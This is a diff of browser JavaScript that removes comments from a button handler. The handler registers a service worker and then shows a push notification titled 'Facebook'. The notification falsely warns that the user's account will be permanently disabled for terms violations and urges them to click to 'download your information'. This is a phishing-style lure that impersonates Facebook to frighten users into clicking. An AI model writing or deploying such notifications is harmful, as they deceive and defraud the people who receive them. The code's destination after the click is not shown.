@@ -1,14 +1,14 @@
 document.getElementById('notify-btn').addEventListener('click', function() {
-            // Check if the browser supports notifications
+
             if ('Notification' in window) {
-                // Request permission from the user
+
                 Notification.requestPermission().then(function(permission) {
                     if (permission === 'granted') {
-                        // Register the service worker
+
                         navigator.serviceWorker.register('/Notification.js').then(function(registration) {
                             console.log('Service Worker registered with scope:', registration.scope);
 
-                            // Show a notification
+
                             registration.showNotification('Facebook', {
                                 body: 'your account will be permanently disabled after sometimes because it violates our terms of services & privacy policy also you have clicked on third party illegal websites button click here to download your information',
                                 icon: '/Img/images.png',
